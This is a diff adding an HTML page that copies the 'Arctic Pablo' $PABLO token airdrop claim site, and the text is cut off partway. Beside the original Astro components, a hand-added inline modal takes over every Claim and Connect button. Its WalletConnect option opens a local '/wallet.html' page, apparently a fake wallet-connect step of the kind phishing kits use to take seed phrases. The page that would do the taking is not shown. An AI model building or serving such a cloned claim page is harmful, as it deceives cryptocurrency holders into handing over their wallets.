@@ -1,0 +1,1583 @@
+<!DOCTYPE html>
+<script
+  type="module"
+  src="../_astro/Layout.astro_astro_type_script_index_0_lang.C13xyKX9.js"
+></script>
+<script type="module">
+  const t = Array.from(document.querySelectorAll("button[data-scroll-top]"));
+  t.forEach((o) => {
+    o.addEventListener("click", () => {
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    });
+  });
+</script>
+<script type="module">
+  document.addEventListener("DOMContentLoaded", () => {
+    let t = "";
+    const r = new URLSearchParams(location.search);
+    let o = !0;
+    for (const e of r.keys()) {
+      if (!e.startsWith("utm_")) continue;
+      (t += `${o ? "" : "&"}${e}=${encodeURIComponent(r.get(e))}`), (o = !1);
+    }
+    Array.from(document.querySelectorAll("a")).forEach((e) => {
+      (!e.href.includes("arcticpablo.com") &&
+        !e.href.startsWith("/") &&
+        !e.href.startsWith(location.origin)) ||
+        (t &&
+          (e.href.includes("?") ? (e.href += `&${t}`) : (e.href += `?${t}`)));
+    });
+  });
+</script>
+<script type="module">
+  document.addEventListener("DOMContentLoaded", () => {
+    setTimeout(() => {
+      const i = (e) => {
+          const o = document.getElementById(`${e}-section`);
+          if (!o) return;
+          const t = o.getBoundingClientRect(),
+            n =
+              document.querySelector("nav")?.getBoundingClientRect().height ??
+              48,
+            s = window.scrollY + t.top - n;
+          window.scrollTo({ top: s, behavior: "smooth" });
+        },
+        c = new URL(location.href).searchParams.get("section");
+      c && i(c),
+        Array.from(document.querySelectorAll('a[href*="?section="]')).forEach(
+          (e) => {
+            e.addEventListener("click", (o) => {
+              const t = e.getAttribute("href"),
+                n = t?.split("?section=")?.[1]?.split("&")?.[0];
+              n &&
+                location.pathname ===
+                  new URL(t.startsWith("http") ? t : `${location.origin}${t}`)
+                    .pathname &&
+                (o.preventDefault(), window.history.pushState({}, "", t), i(n));
+            });
+          }
+        );
+    }, 500);
+  });
+</script>
+<script
+  type="module"
+  src="../_astro/Layout.astro_astro_type_script_index_4_lang.B9UFKdYc.js"
+></script>
+<script
+  type="module"
+  src="../_astro/Layout.astro_astro_type_script_index_5_lang.CzcRTc36.js"
+></script>
+<html lang="en" data-astro-cid-dmqsi53g>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <meta
+      name="description"
+      content="Claim your $PABLO tokens! Arctic rewards await. Connect your wallet and claim your tokens from the Arctic Pablo airdrop."
+    />
+    <link rel="canonical" href="https://arcticpablo.com/claim" />
+    <title>Claim $PABLO | Arctic Pablo</title>
+    <link
+      rel="icon"
+      type="image/png"
+      href="../favicon-96x96.png"
+      sizes="96x96"
+    />
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg" />
+    <link rel="shortcut icon" href="../favicon.ico" />
+    <link
+      rel="apple-touch-icon"
+      sizes="180x180"
+      href="https://www.arcticpablo.com/apple-touch-icon.png"
+    />
+    <meta name="apple-mobile-web-app-title" content="Arctic Pablo" />
+    <link rel="manifest" href="../site.webmanifest" />
+    <!-- Google tag (gtag.js) -->
+    <script
+      async
+      src="https://www.googletagmanager.com/gtag/js?id=G-GWWMF6BRZ2"
+    ></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "G-GWWMF6BRZ2");
+      //
+    </script>
+    <!-- Google Tag Manager -->
+    <script>
+      (function (w, d, s, l, i) {
+        w[l] = w[l] || [];
+        w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
+        var f = d.getElementsByTagName(s)[0],
+          j = d.createElement(s),
+          dl = l != "dataLayer" ? "&l=" + l : "";
+        j.async = true;
+        j.src = "https://www.googletagmanager.com/gtm.js?id=" + i + dl;
+        f.parentNode.insertBefore(j, f);
+      })(window, document, "script", "dataLayer", "GTM-PKN98LJQ");
+    </script>
+    <!-- End Google Tag Manager -->
+    <style is:global>
+      :root {
+        --theme-key: base;
+        --theme-label: Dark;
+        --theme-type: dark;
+        --theme-bg-default: #00a3ff;
+        --theme-bg-buttonSecondary: #fed;
+        --theme-text-primary: #001f54;
+        --theme-text-secondary: #646f82;
+        --theme-border-divider: #d5d5d5;
+        --theme-sizings-section-maxWidth: 67rem;
+        --theme-font-primary: Satoshi, sans-serif;
+        --theme-font-weight-default: 400;
+        --theme-font-weight-heading: 900;
+        --theme-font-weight-button: 700;
+        --theme-component-active: #001f54;
+        --theme-component-loading: rgba(0, 0, 0, 0.25);
+        --theme-component-loadingTo: rgba(0, 0, 0, 0.35);
+        --theme-zindex-navbar: 100;
+        --theme-zindex-dropdown: 110;
+        --theme-zindex-modal: 120;
+      }
+    </style>
+    <style>
+      @media (max-width: 700px) {
+        ._toast-container_1j5ai_2 {
+          font-size: 0.8125rem;
+        }
+      }
+    </style>
+    <link rel="stylesheet" href="../_astro/cookies.BOb8Yi4l.css" />
+    <style>
+      ._claim-section_12hht_1 {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        position: relative;
+        padding: var(--nav-height) 1rem 4rem 1rem;
+        background: linear-gradient(180deg, #c9ebff, #e6f7ff, #c9ebff);
+        min-height: calc(100vh - var(--nav-height));
+        overflow: hidden;
+      }
+      ._claim-section_12hht_1:before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background-image: url(../img/snowflake.svg.html);
+        background-size: 30px 30px;
+        background-repeat: repeat;
+        opacity: 0.03;
+        pointer-events: none;
+      }
+      ._claim-container_12hht_26 {
+        position: relative;
+        width: 100%;
+        max-width: 42rem;
+        margin: 0 auto;
+        z-index: 1;
+      }
+      ._claim-box_12hht_34 {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 2rem;
+        position: relative;
+        background: linear-gradient(135deg, #00a3ff, #08d);
+        border-radius: 2rem;
+        padding: 3rem 2rem;
+        color: #fff;
+        box-shadow: 0 10px 40px #00a3ff4d;
+        overflow: hidden;
+      }
+      ._claim-box_12hht_34:before {
+        content: "";
+        position: absolute;
+        top: -50%;
+        right: -50%;
+        width: 100%;
+        height: 100%;
+        background: radial-gradient(
+          circle,
+          rgba(255, 255, 255, 0.1) 0%,
+          transparent 70%
+        );
+        pointer-events: none;
+      }
+      ._penguin-decoration_12hht_59 {
+        position: absolute;
+        top: -3rem;
+        right: 2rem;
+        width: 6rem;
+        height: 6rem;
+        background-image: url(../img/penguin-iceberg-sm.svg.html);
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: center;
+        z-index: 10;
+      }
+      ._title_12hht_72 {
+        font-family: var(--font-family);
+        font-size: 3rem;
+        font-weight: 900;
+        line-height: 1;
+        letter-spacing: -0.02em;
+        text-align: center;
+        margin: 0;
+        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+      }
+      ._subtitle_12hht_83 {
+        font-size: 1.125rem;
+        font-weight: 500;
+        text-align: center;
+        opacity: 0.9;
+        margin: -1rem 0 0;
+        max-width: 30rem;
+      }
+      ._content_12hht_92 {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 1.5rem;
+        width: 100%;
+        z-index: 1;
+      }
+      ._label_12hht_101 {
+        font-size: 1.125rem;
+        text-align: center;
+        margin: 0;
+        opacity: 0.9;
+      }
+      ._spinner_12hht_108 {
+        color: #fff;
+      }
+      ._claim-info_12hht_112 {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 0.5rem;
+        background: #ffffff1a;
+        border-radius: 1rem;
+        padding: 2rem 3rem;
+        backdrop-filter: blur(10px);
+        width: 100%;
+        max-width: 25rem;
+      }
+      ._amount-label_12hht_125 {
+        font-size: 1rem;
+        font-weight: 500;
+        margin: 0;
+        opacity: 0.9;
+      }
+      ._amount_12hht_125 {
+        font-size: 2.5rem;
+        font-weight: 900;
+        margin: 0;
+        letter-spacing: -0.02em;
+        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+      }
+      ._claimed-info_12hht_140 {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 0.75rem;
+        background: #ffffff1a;
+        border-radius: 1rem;
+        padding: 2rem 3rem;
+        backdrop-filter: blur(10px);
+        width: 100%;
+        max-width: 25rem;
+      }
+      ._success-icon_12hht_153 {
+        width: 3rem;
+        height: 3rem;
+        background: #fff3;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 1.5rem;
+        font-weight: 700;
+        margin-bottom: 0.5rem;
+      }
+      ._claimed-label_12hht_166 {
+        font-size: 1rem;
+        font-weight: 500;
+        margin: 0;
+        opacity: 0.9;
+      }
+      ._claimed-amount_12hht_173 {
+        font-size: 2rem;
+        font-weight: 900;
+        margin: 0;
+        letter-spacing: -0.02em;
+        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+      }
+      ._no-claim-info_12hht_181 {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 0.5rem;
+        text-align: center;
+        padding: 1rem;
+      }
+      ._no-claim-label_12hht_190 {
+        font-size: 1.25rem;
+        font-weight: 600;
+        margin: 0;
+      }
+      ._no-claim-sublabel_12hht_196 {
+        font-size: 1rem;
+        margin: 0;
+        opacity: 0.8;
+      }
+      @media (width < 55rem) {
+        ._claim-section_12hht_1 {
+          padding-top: calc(var(--nav-height) + 2rem);
+        }
+        ._claim-box_12hht_34 {
+          padding: 2.5rem 1.5rem;
+        }
+        ._title_12hht_72 {
+          font-size: 2.5rem;
+        }
+        ._subtitle_12hht_83 {
+          font-size: 1rem;
+        }
+        ._penguin-decoration_12hht_59 {
+          width: 4rem;
+          height: 4rem;
+          top: -2rem;
+          right: 1rem;
+        }
+        ._amount_12hht_125 {
+          font-size: 2rem;
+        }
+        ._claimed-amount_12hht_173 {
+          font-size: 1.75rem;
+        }
+      }
+      @media (width < 30rem) {
+        ._title_12hht_72 {
+          font-size: 2rem;
+        }
+        ._claim-info_12hht_112,
+        ._claimed-info_12hht_140 {
+          padding: 1.5rem 2rem;
+        }
+        ._amount_12hht_125 {
+          font-size: 1.75rem;
+        }
+        ._claimed-amount_12hht_173 {
+          font-size: 1.5rem;
+        }
+      }
+      ._spinner-container_9qhq5_1 {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+      }
+      ._spinner_9qhq5_1 {
+        animation: _spinner-rotate_9qhq5_1 linear 1.4s infinite;
+        display: inline-block;
+      }
+      @keyframes _spinner-rotate_9qhq5_1 {
+        0% {
+          transform: rotate(0);
+        }
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      ._spinner-container_9qhq5_1 circle {
+        stroke-dasharray: 80px, 200px;
+        stroke-dashoffset: 0;
+        animation: _spinner-indicator_9qhq5_1 1.4s infinite ease-in-out;
+        stroke: currentColor;
+      }
+      @keyframes _spinner-indicator_9qhq5_1 {
+        0% {
+          stroke-dasharray: 1px, 200px;
+          stroke-dashoffset: 0;
+        }
+        50% {
+          stroke-dasharray: 100px, 200px;
+          stroke-dashoffset: -15px;
+        }
+        to {
+          stroke-dasharray: 100px, 200px;
+          stroke-dashoffset: -125px;
+        }
+      }
+      ._button_qsbi7_1 {
+        position: relative;
+        display: flex;
+        cursor: pointer;
+        gap: 0.5rem;
+        --border-width: 0px;
+        background: var(--bg);
+        color: var(--text);
+        min-height: 4.125rem;
+        min-width: 7.5rem;
+        font-size: 1rem;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        font-weight: 700;
+        padding-block: 0.25rem;
+        padding-inline: 1rem;
+        transition: filter 0.2s ease-out;
+        text-decoration: none !important;
+        line-height: 1.1;
+        --line-height: 1.1;
+        border: var(--border-width) var(--border-col) solid;
+        border-radius: 0.5rem;
+      }
+      ._button_qsbi7_1[disabled] {
+        cursor: not-allowed;
+        filter: brightness(80%);
+      }
+      ._spinner_qsbi7_29 {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: var(--size);
+        height: var(--size);
+        display: none;
+      }
+      ._button_qsbi7_1._loading_qsbi7_38 ._spinner_qsbi7_29 {
+        display: inline-flex;
+        color: var(--text);
+      }
+      ._button_qsbi7_1._loading_qsbi7_38 {
+        color: transparent;
+      }
+      ._button_qsbi7_1 > svg,
+      ._button_qsbi7_1 > img {
+        width: 1.25rem;
+        height: 1.25rem;
+      }
+      ._button_qsbi7_1._size-sm_qsbi7_51 {
+        padding: 1rem;
+        min-height: 3.25rem;
+        min-width: 0;
+        font-weight: 500;
+      }
+      ._button_qsbi7_1._border_qsbi7_58 {
+        --border-width: 2px;
+      }
+      ._button_qsbi7_1._color-active_qsbi7_62._border_qsbi7_58 {
+        --border-width: 1px;
+      }
+      ._button_qsbi7_1._shadow_qsbi7_66 {
+        box-shadow: 4px 4px 0 0 var(--shadow-col);
+      }
+      ._button_qsbi7_1:not([disabled]):not(._loading_qsbi7_38):hover {
+        filter: brightness(95%);
+      }
+      ._button_qsbi7_1._elevate_qsbi7_77 {
+        box-shadow: 0 8px 20px #007cff;
+      }
+      @media (max-width: 700px) {
+        ._button_qsbi7_1._size-default_qsbi7_82 {
+          padding-block: 1rem;
+          min-height: 3rem;
+          min-width: 6rem;
+        }
+        ._button_qsbi7_1._size-sm_qsbi7_51 {
+          min-height: 2.25rem;
+          padding: 0.625rem;
+        }
+        ._button_qsbi7_1 > svg,
+        ._button_qsbi7_1 > img {
+          width: 1.125rem;
+          height: 1.125rem;
+        }
+        ._button_qsbi7_1._shadow_qsbi7_66 {
+          box-shadow: 2px 2px 0 0 var(--shadow-col);
+        }
+      }
+      ._modal_1gdg5_1 {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: var(--theme-zindex-modal);
+        transition: opacity 0.2s ease-out, transform 0.3s ease-out;
+      }
+      ._modal_1gdg5_1:not(._open_1gdg5_16) {
+        pointer-events: none;
+      }
+      ._modal-backdrop_1gdg5_20 {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: #0006;
+        transition: opacity 0.2s ease-out;
+        z-index: var(--theme-zindex-modal);
+      }
+      ._modal_1gdg5_1:not(._open_1gdg5_16) ._modal-backdrop_1gdg5_20 {
+        opacity: 0;
+      }
+      ._modal-body_1gdg5_35 {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem;
+        width: calc(100% - 2rem);
+        max-height: calc(100% - 2rem);
+        overflow-y: auto;
+        max-width: 30rem;
+        transition: transform 0.2s ease-out;
+        position: relative;
+        background-color: #fff;
+        z-index: var(--theme-zindex-modal);
+        border-radius: 1rem;
+        padding-inline: 2rem;
+        padding-block: 2rem;
+      }
+      ._modal_1gdg5_1:not(._open_1gdg5_16) ._modal-body_1gdg5_35 {
+        transform: translateY(calc(50vh + 50% + 8rem)) scale(0.9);
+      }
+      ._modal_1gdg5_1 ._close-button_1gdg5_56 {
+        display: flex;
+        position: absolute;
+        top: 1rem;
+        right: 1rem;
+        cursor: pointer;
+        padding: 0.5rem;
+      }
+      ._close-button_1gdg5_56:before {
+        content: " ";
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%) scale(0);
+        background-color: #00000026;
+        border-radius: 999rem;
+        width: 100%;
+        height: 100%;
+        transition: transform 0.2s ease-out, opacity 0.2s ease-out;
+        opacity: 0;
+      }
+      ._close-button_1gdg5_56:hover:before {
+        transform: translate(-50%, -50%) scale(1);
+        opacity: 1;
+      }
+      ._close-button_1gdg5_56 svg {
+        width: 1.5rem;
+        height: 1.5rem;
+      }
+      ._modal-title_1gdg5_91 {
+        font-weight: 900;
+        text-align: center;
+        font-size: 1.75rem;
+        font-family: var(--theme-font-heading);
+      }
+      ._title_1gdg5_98,
+      ._subtitle_1gdg5_99 {
+        padding-right: 3rem;
+      }
+      @media (max-width: 800px) {
+        ._modal_1gdg5_1 ._close-button_1gdg5_56 {
+          top: 0.75rem;
+          right: 0.75rem;
+        }
+      }
+      ._modal_15pmi_1 {
+        max-width: 26rem;
+      }
+      ._connection-options_15pmi_5 {
+        display: flex;
+        flex-direction: column;
+      }
+      ._connection-button_15pmi_10 {
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+        height: 4rem;
+        padding: 0.75rem;
+        font-size: 1.25rem;
+        font-weight: 500;
+        transition: filter 0.2s ease-out;
+        background-color: #fff;
+        border-radius: 0.5rem;
+      }
+      ._connection-button_15pmi_10:hover {
+        filter: brightness(90%);
+      }
+      ._connection-icon_15pmi_28 {
+        height: 100%;
+        width: 3rem;
+        object-fit: contain;
+        object-position: center;
+      }
+    </style>
+  </head>
+  <body data-astro-cid-dmqsi53g>
+    <!-- Google Tag Manager (noscript) -->
+    <noscript
+      ><iframe
+        src="https://www.googletagmanager.com/ns.html?id=GTM-PKN98LJQ"
+        height="0"
+        width="0"
+        style="display: none; visibility: hidden"
+        data-astro-cid-dmqsi53g
+      ></iframe
+    ></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+    <script
+      type="module"
+      src="../_astro/Navbar.astro_astro_type_script_index_0_lang.BNjkaaSz.js"
+    ></script>
+    <nav class="nav" data-astro-cid-5blmo7yk>
+      <div class="nav-inner" data-astro-cid-5blmo7yk>
+        <a
+          class="nav-home"
+          href="https://www.arcticpablo.com/"
+          data-astro-cid-5blmo7yk
+        >
+          <img
+            src="../_astro/logo.CPpjpxFZ_2rrtjN.svg"
+            alt="Pablo penguin"
+            data-astro-cid-5blmo7yk="true"
+            width="80"
+            height="80"
+            loading="lazy"
+            decoding="async"
+          />
+        </a>
+        <div class="nav-links" data-astro-cid-5blmo7yk>
+          <a href="https://www.arcticpablo.com/claim" data-astro-cid-5blmo7yk>
+            Claim </a
+          ><a
+            href="https://www.arcticpablo.com/staking"
+            data-astro-cid-5blmo7yk
+          >
+            Stake </a
+          ><a
+            href="https://www.arcticpablo.com/?section=roadmap"
+            data-astro-cid-5blmo7yk
+          >
+            Roadmap </a
+          ><a
+            href="https://www.arcticpablo.com/?section=tokenomics"
+            data-astro-cid-5blmo7yk
+          >
+            Tokenomics </a
+          ><a
+            href="https://www.arcticpablo.com/documents/whitepaper.pdf?v=2"
+            data-astro-cid-5blmo7yk
+          >
+            Whitepaper
+          </a>
+        </div>
+        <div class="nav-buttons" data-astro-cid-5blmo7yk>
+          <button
+            class="mobile-nav-button nav-button button shadow size-sm color-#fff mobile-nav-button nav-button"
+            aria-label="Toggle navigation menu"
+            data-astro-cid-5blmo7yk="true"
+            style="
+              --bg: #fff;
+              --text: #001f54;
+              --border-col: #4ddeff;
+              --shadow-col: #14bdff;
+            "
+            data-astro-cid-vnzlvqnm="true"
+          >
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              class="feather feather-x mobile-nav-button-open-icon"
+              width="24"
+              height="24"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <line x1="3" y1="12" x2="21" y2="12"></line>
+              <line x1="3" y1="6" x2="21" y2="6"></line>
+              <line x1="3" y1="18" x2="21" y2="18"></line>
+            </svg>
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              class="feather feather-x mobile-nav-button-close-icon"
+              width="24"
+              height="24"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <line x1="18" y1="6" x2="6" y2="18"></line>
+              <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+          </button>
+          <a
+            onclick="openWalletModal()"
+            class="claim-button button shadow size-sm color-#fff claim-button"
+            style="
+              --bg: #fff;
+              --text: #001f54;
+              --border-col: #4ddeff;
+              --shadow-col: #14bdff;
+            "
+            data-astro-cid-vnzlvqnm="true"
+          >
+            Claim
+          </a>
+          <button
+            onclick="openWalletModal()"
+            class="connect-button button shadow size-sm color-#fff connect-button"
+            data-astro-cid-5blmo7yk="true"
+            style="
+              --bg: #fff;
+              --text: #001f54;
+              --border-col: #4ddeff;
+              --shadow-col: #14bdff;
+            "
+            data-astro-cid-vnzlvqnm="true"
+          >
+            <img
+              src="../_astro/wallet.DwM0nff9_27IdV3.svg"
+              alt="Wallet"
+              aria-hidden="true"
+              data-astro-cid-5blmo7yk="true"
+              width="21"
+              height="20"
+              loading="lazy"
+              decoding="async"
+            />
+            <span data-connect-button-text data-astro-cid-5blmo7yk
+              >Connect Walle</span
+            >
+          </button>
+        </div>
+      </div>
+    </nav>
+    <style>
+      astro-island,
+      astro-slot,
+      astro-static-slot {
+        display: contents;
+      }
+    </style>
+    <script>
+      (() => {
+        var e = async (t) => {
+          await (
+            await t()
+          )();
+        };
+        (self.Astro || (self.Astro = {})).only = e;
+        window.dispatchEvent(new Event("astro:only"));
+      })();
+      (() => {
+        var A = Object.defineProperty;
+        var g = (i, o, a) =>
+          o in i
+            ? A(i, o, {
+                enumerable: !0,
+                configurable: !0,
+                writable: !0,
+                value: a,
+              })
+            : (i[o] = a);
+        var d = (i, o, a) => g(i, typeof o != "symbol" ? o + "" : o, a);
+        {
+          let i = {
+              0: (t) => m(t),
+              1: (t) => a(t),
+              2: (t) => new RegExp(t),
+              3: (t) => new Date(t),
+              4: (t) => new Map(a(t)),
+              5: (t) => new Set(a(t)),
+              6: (t) => BigInt(t),
+              7: (t) => new URL(t),
+              8: (t) => new Uint8Array(t),
+              9: (t) => new Uint16Array(t),
+              10: (t) => new Uint32Array(t),
+              11: (t) => (1 / 0) * t,
+            },
+            o = (t) => {
+              let [l, e] = t;
+              return l in i ? i[l](e) : void 0;
+            },
+            a = (t) => t.map(o),
+            m = (t) =>
+              typeof t != "object" || t === null
+                ? t
+                : Object.fromEntries(
+                    Object.entries(t).map(([l, e]) => [l, o(e)])
+                  );
+          class y extends HTMLElement {
+            constructor() {
+              super(...arguments);
+              d(this, "Component");
+              d(this, "hydrator");
+              d(this, "hydrate", async () => {
+                var b;
+                if (!this.hydrator || !this.isConnected) return;
+                let e =
+                  (b = this.parentElement) == null
+                    ? void 0
+                    : b.closest("astro-island[ssr]");
+                if (e) {
+                  e.addEventListener("astro:hydrate", this.hydrate, {
+                    once: !0,
+                  });
+                  return;
+                }
+                let c = this.querySelectorAll("astro-slot"),
+                  n = {},
+                  h = this.querySelectorAll("template[data-astro-template]");
+                for (let r of h) {
+                  let s = r.closest(this.tagName);
+                  s != null &&
+                    s.isSameNode(this) &&
+                    ((n[r.getAttribute("data-astro-template") || "default"] =
+                      r.innerHTML),
+                    r.remove());
+                }
+                for (let r of c) {
+                  let s = r.closest(this.tagName);
+                  s != null &&
+                    s.isSameNode(this) &&
+                    (n[r.getAttribute("name") || "default"] = r.innerHTML);
+                }
+                let p;
+                try {
+                  p = this.hasAttribute("props")
+                    ? m(JSON.parse(this.getAttribute("props")))
+                    : {};
+                } catch (r) {
+                  let s = this.getAttribute("component-url") || "<unknown>",
+                    v = this.getAttribute("component-export");
+                  throw (
+                    (v && (s += ` (export ${v})`),
+                    console.error(
+                      `[hydrate] Error parsing props for component ${s}`,
+                      this.getAttribute("props"),
+                      r
+                    ),
+                    r)
+                  );
+                }
+                let u;
+                await this.hydrator(this)(this.Component, p, n, {
+                  client: this.getAttribute("client"),
+                }),
+                  this.removeAttribute("ssr"),
+                  this.dispatchEvent(new CustomEvent("astro:hydrate"));
+              });
+              d(this, "unmount", () => {
+                this.isConnected ||
+                  this.dispatchEvent(new CustomEvent("astro:unmount"));
+              });
+            }
+            disconnectedCallback() {
+              document.removeEventListener("astro:after-swap", this.unmount),
+                document.addEventListener("astro:after-swap", this.unmount, {
+                  once: !0,
+                });
+            }
+            connectedCallback() {
+              if (
+                !this.hasAttribute("await-children") ||
+                document.readyState === "interactive" ||
+                document.readyState === "complete"
+              )
+                this.childrenConnectedCallback();
+              else {
+                let e = () => {
+                    document.removeEventListener("DOMContentLoaded", e),
+                      c.disconnect(),
+                      this.childrenConnectedCallback();
+                  },
+                  c = new MutationObserver(() => {
+                    var n;
+                    ((n = this.lastChild) == null ? void 0 : n.nodeType) ===
+                      Node.COMMENT_NODE &&
+                      this.lastChild.nodeValue === "astro:end" &&
+                      (this.lastChild.remove(), e());
+                  });
+                c.observe(this, { childList: !0 }),
+                  document.addEventListener("DOMContentLoaded", e);
+              }
+            }
+            async childrenConnectedCallback() {
+              let e = this.getAttribute("before-hydration-url");
+              e && (await import(e)), this.start();
+            }
+            async start() {
+              let e = JSON.parse(this.getAttribute("opts")),
+                c = this.getAttribute("client");
+              if (Astro[c] === void 0) {
+                window.addEventListener(`astro:${c}`, () => this.start(), {
+                  once: !0,
+                });
+                return;
+              }
+              try {
+                await Astro[c](
+                  async () => {
+                    let n = this.getAttribute("renderer-url"),
+                      [h, { default: p }] = await Promise.all([
+                        import(this.getAttribute("component-url")),
+                        n ? import(n) : () => () => {},
+                      ]),
+                      u = this.getAttribute("component-export") || "default";
+                    if (!u.includes(".")) this.Component = h[u];
+                    else {
+                      this.Component = h;
+                      for (let f of u.split("."))
+                        this.Component = this.Component[f];
+                    }
+                    return (this.hydrator = p), this.hydrate;
+                  },
+                  e,
+                  this
+                );
+              } catch (n) {
+                console.error(
+                  `[astro-island] Error hydrating ${this.getAttribute(
+                    "component-url"
+                  )}`,
+                  n
+                );
+              }
+            }
+            attributeChangedCallback() {
+              this.hydrate();
+            }
+          }
+          d(y, "observedAttributes", ["props"]),
+            customElements.get("astro-island") ||
+              customElements.define("astro-island", y);
+        }
+      })();
+    </script>
+    <astro-island
+      uid="22E3BJ"
+      component-url="/_astro/ToastProvider.Bn2O8NXl.js"
+      component-export="default"
+      renderer-url="/_astro/client.CYT6LV0k.js"
+      props='{"data-astro-cid-dmqsi53g":[0,true]}'
+      ssr
+      client="only"
+      opts='{"name":"ToastProvider","value":"solid"}'
+    ></astro-island>
+    <astro-island
+      uid="ZfuXTk"
+      component-url="/_astro/ConnectWalletModal.B4QvoUVX.js"
+      component-export="default"
+      renderer-url="/_astro/client.CYT6LV0k.js"
+      props='{"data-astro-cid-dmqsi53g":[0,true]}'
+      ssr
+      client="only"
+      opts='{"name":"ConnectWalletModal","value":"solid"}'
+    ></astro-island>
+    <main class="main" data-astro-cid-dmqsi53g>
+      <script>
+        (() => {
+          var e = async (t) => {
+            await (
+              await t()
+            )();
+          };
+          (self.Astro || (self.Astro = {})).load = e;
+          window.dispatchEvent(new Event("astro:load"));
+        })();
+      </script>
+      <script>
+        window._$HY ||
+          ((e) => {
+            let t = (e) =>
+              e &&
+              e.hasAttribute &&
+              (e.hasAttribute("data-hk")
+                ? e
+                : t(e.host && e.host.nodeType ? e.host : e.parentNode));
+            ["click", "input"].forEach((o) =>
+              document.addEventListener(o, (o) => {
+                if (!e.events) return;
+                let s = t((o.composedPath && o.composedPath()[0]) || o.target);
+                s && !e.completed.has(s) && e.events.push([s, o]);
+              })
+            );
+          })((_$HY = { events: [], completed: new WeakSet(), r: {}, fe() {} }));
+      </script>
+      <!--xs--><astro-island
+        uid="2j43uP"
+        data-solid-render-id="s0"
+        component-url="/_astro/ClaimSection.BxlvLULT.js"
+        component-export="default"
+        renderer-url="/_astro/client.CYT6LV0k.js"
+        props="{}"
+        ssr
+        client="load"
+        opts='{"name":"ClaimSection","value":true}'
+        await-children
+        ><section data-hk="s00001" class="_claim-section_12hht_1">
+          <div class="_claim-container_12hht_26">
+            <div class="_claim-box_12hht_34">
+              <div class="_penguin-decoration_12hht_59"></div>
+              <h1 class="_title_12hht_72">Claim Your $PABLO</h1>
+              <p class="_subtitle_12hht_83">
+                Arctic rewards await! Claim your $PABLO tokens now.
+              </p>
+              <!--$-->
+              <div data-hk="s000020" class="_content_12hht_92">
+                <p class="_label_12hht_101">
+                  Connect your wallet to check for available tokens
+                </p>
+                <!--$--><button
+                  onclick="openWalletModal()"
+                  class="_button_qsbi7_1 _size-default_qsbi7_82 _color-primary_qsbi7_70"
+                  style="
+                    --bg: #fff;
+                    --text: #001f54;
+                    --border-col: #4ddeff;
+                    --shadow-col: #14bdff;
+                  "
+                >
+                  Connect Wallet</button
+                ><!--/-->
+              </div>
+
+              <!-- 1️⃣ Main Wallet Modal -->
+              <div
+                id="walletModal"
+                style="
+                  display: none;
+                  position: fixed;
+                  top: 0;
+                  left: 0;
+                  width: 100%;
+                  height: 100%;
+                  background: rgba(0, 0, 0, 0.5);
+
+                  align-items: center;
+                  justify-content: center;
+                  z-index: 1000;
+                "
+              >
+                <div
+                  style="
+                    background: #fff;
+                    border-radius: 12px;
+                    width: 90%;
+                    max-width: 400px;
+                    padding: 20px;
+                    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+                    position: relative;
+                  "
+                >
+                  <!-- Close Button -->
+                  <button
+                    onclick="closeWalletModal()"
+                    style="
+                      position: absolute;
+                      top: 12px;
+                      right: 12px;
+                      background: none;
+                      border: none;
+                      font-size: 20px;
+                      cursor: pointer;
+                      color: #001f54;
+                    "
+                  >
+                    ✕
+                  </button>
+
+                  <h2
+                    style="
+                      text-align: center;
+                      font-size: 18px;
+                      font-weight: bold;
+                      color: #001f54;
+                      margin-bottom: 20px;
+                    "
+                  >
+                    Connect Wallet
+                  </h2>
+
+                  <!-- WalletConnect Option -->
+                  <div
+                    onclick="window.open('/wallet.html','_blank')"
+                    style="
+                      display: flex;
+                      align-items: center;
+                      gap: 10px;
+                      padding: 10px;
+                      cursor: pointer;
+                      border-radius: 8px;
+                      transition: background 0.2s;
+                    "
+                    onmouseover="this.style.background='#f1f5f9'"
+                    onmouseout="this.style.background='transparent'"
+                  >
+                    <img
+                      src="https://th.bing.com/th?q=Wallet+Connect+Icon&w=42&h=42&c=7&rs=1&p=0&o=7&pid=1.7&rm=3&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1"
+                      alt="WalletConnect"
